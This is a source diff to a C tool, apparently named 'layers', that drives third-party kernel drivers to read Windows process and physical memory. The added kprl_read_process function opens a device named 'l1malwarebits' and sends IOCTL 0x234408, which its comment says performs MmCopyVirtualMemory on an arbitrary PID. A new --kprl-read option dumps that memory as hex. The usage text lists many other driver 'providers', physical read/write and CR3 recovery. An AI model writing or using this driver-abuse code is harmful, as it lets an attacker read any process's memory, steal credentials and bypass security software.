@@ -1912,10 +1912,30 @@ static int kprl_locate_cr3(uint32_t pid, const char *device, uint64_t *out_cr3) 
     return 1;
 }
 
-// ---------------------------------------------------------------------------
-// 定位层辅助：从注册表读取物理内存范围（HARDWARE\RESOURCEMAP\...\Physical Memory）
-// 这样物理扫描 locator 不需要用户手工提供范围，也不需要内核读驱动。
-// ---------------------------------------------------------------------------
+static int kprl_read_process(uint32_t pid, uint64_t src_va, void *dst, uint32_t size, const char *device) {
+    const char *paths[] = { device, "\\\\.\\KPRL", "\\\\.\\kprl", "\\\\.\\l1malwarebits",
+                            "\\\\.\\GlobalRoot\\Device\\KPRL" };
+    HANDLE h = INVALID_HANDLE_VALUE;
+    for (int i = 0; i < (int)(sizeof(paths) / sizeof(paths[0])) && h == INVALID_HANDLE_VALUE; i++) {
+        if (!paths[i] || !paths[i][0]) continue;
+        h = CreateFileA(paths[i], GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                        NULL, OPEN_EXISTING, 0, NULL);
+    }
+    if (h == INVALID_HANDLE_VALUE) return 0;
+    uint8_t in[0x28];
+    memset(in, 0, sizeof(in));
+    // KPRL l1malwarebits.sys: IOCTL 0x234408 = MmCopyVirtualMemory(target_pid, src, current, dst, size)
+    *(uint64_t *)(in + 0x08) = (uint64_t)(uintptr_t)dst;
+    *(uint64_t *)(in + 0x10) = src_va;
+    *(uint32_t *)(in + 0x18) = size;
+    *(uint32_t *)(in + 0x20) = pid;
+    DWORD ret = 0;
+    BOOL ok = DeviceIoControl(h, 0x234408u, in, sizeof(in), in, sizeof(in), &ret, NULL);
+    CloseHandle(h);
+    return ok ? 1 : 0;
+}
+
+
 typedef struct { uint64_t start; uint64_t length; } mb_range;
 
 // Parse a CM_RESOURCE_LIST blob (.Translated REG_RESOURCE_LIST). Kept separate so
@@ -2836,7 +2856,7 @@ static void usage(void) {
     printf("  layers --locate --kprl --pid <pid> [--kprl-device <path>]     (KPRL CR3-by-PID; no physical reader needed)\n");
     printf("  layers --locate --invary --pid <pid> [--invary-device <path>] (Invary Sensor kernel-VA locator)\n");
     printf("  layers --cchwapi-cr3-current [--device \\\\.\\CCHWAPI]  (low-risk CCHWApi 2.9 control-register CR3 only)\n");
-    printf("  layers --pfn-cr3 --eproc <hex> [--nt-base <hex>] [--pfn-max <n>]  (PFN-database CR3 recovery)\n");
+    printf("  layers --kprl-read --pid <pid> --va <hex> --size <n> [--kprl-device <path>]  (KPRL process read, no KKYUM)\n");
     printf("  layers --locate --cchwapi-only --pid <pid> [--device \\\\.\\CCHWAPI]  (CCHWApi 2.9 only: control-reg CR3 + page-table walk, no scan)\n");
     printf("  layers --locate --scan-providers --pid <pid> [--auto-ranges | --scan-start <hex> --scan-size <hex>] [--va <hex> --size <n>]  (try 20 physical providers)\n");
     printf("  layers --locate --scan-bench --pid <pid> ...  (same, print per-provider open/scan timing)\n");
@@ -2856,7 +2876,7 @@ int main(int argc, char **argv) {
     int do_selftest = 0, do_read_phys = 0, do_write_phys = 0, do_explicit = 0, do_locate = 0, have_cr3 = 0, have_va = 0;
     int use_la57 = 0, do_translate_only = 0;
     const char *data_hex = NULL;
-    int do_ranges = 0, auto_ranges = 0, use_kkyum = 0, use_kprl = 0, use_invary = 0, use_auto = 0, use_scan_providers = 0, use_cchwapi_only = 0, do_cchwapi_current = 0, do_translate_debug = 0, do_scan_bench = 0, do_invary_read = 0, do_read_process = 0, do_probe = 0, do_probe_loc = 0, do_probe_all = 0, do_list = 0, do_list_legacy = 0, do_hvci = 0, do_kkyum_kbase = 0, do_kkyum_kread = 0, do_pfn_cr3 = 0, have_eproc = 0;
+    int do_ranges = 0, auto_ranges = 0, use_kkyum = 0, use_kprl = 0, use_invary = 0, use_auto = 0, use_scan_providers = 0, use_cchwapi_only = 0, do_cchwapi_current = 0, do_translate_debug = 0, do_scan_bench = 0, do_invary_read = 0, do_read_process = 0, do_probe = 0, do_probe_loc = 0, do_probe_all = 0, do_list = 0, do_list_legacy = 0, do_hvci = 0, do_kkyum_kbase = 0, do_kkyum_kread = 0, do_pfn_cr3 = 0, have_eproc = 0, do_kprl_read = 0;
     uint64_t pfn_eproc = 0, pfn_max = 0x200000;
     for (int i = 1; i < argc; i++) {
         if (strcmp(argv[i], "--selftest-mock") == 0) do_selftest = 1;
@@ -2900,6 +2920,7 @@ int main(int argc, char **argv) {
         else if (strcmp(argv[i], "--kkyum-kbase") == 0) do_kkyum_kbase = 1;
         else if (strcmp(argv[i], "--kkyum-kread") == 0) do_kkyum_kread = 1;
         else if (strcmp(argv[i], "--pfn-cr3") == 0) do_pfn_cr3 = 1;
+        else if (strcmp(argv[i], "--kprl-read") == 0) do_kprl_read = 1;
         else if (strcmp(argv[i], "--eproc") == 0 && i + 1 < argc) { pfn_eproc = _strtoui64(argv[++i], NULL, 0); have_eproc = 1; }
         else if (strcmp(argv[i], "--pfn-max") == 0 && i + 1 < argc) pfn_max = _strtoui64(argv[++i], NULL, 0);
         else if (strcmp(argv[i], "--nt-base") == 0 && i + 1 < argc) g_nt_base_override = _strtoui64(argv[++i], NULL, 0);
@@ -2916,6 +2937,22 @@ int main(int argc, char **argv) {
     if (do_probe) return probe_readers();
     if (do_probe_all) return probe_all();
     if (do_list) return list_providers();
+    if (do_kprl_read) {
+        if (!pid || !have_va || size == 0) { printf("[ERR] --kprl-read needs --pid --va --size\n"); return 6; }
+        uint8_t *b = (uint8_t *)calloc(1, size);
+        if (!b) return 6;
+        if (!kprl_read_process(pid, va, b, size, kprl_device)) {
+            printf("[ERR] KPRL read failed pid=%u VA=0x%llX size=0x%X\n",
+                   pid, (unsigned long long)va, size);
+            free(b);
+            return 5;
+        }
+        printf("KPRL_READ PID=%u VA=0x%llX size=0x%X HEX=", pid, (unsigned long long)va, size);
+        for (uint32_t i = 0; i < size; i++) printf("%02X", b[i]);
+        printf("\nVERDICT=PASS\n");
+        free(b);
+        return 0;
+    }
     if (do_kkyum_kbase || do_kkyum_kread || do_pfn_cr3) {
         if (!kkyum_open(kkyum_device)) return 3;
         mb_kernel_reader kr;
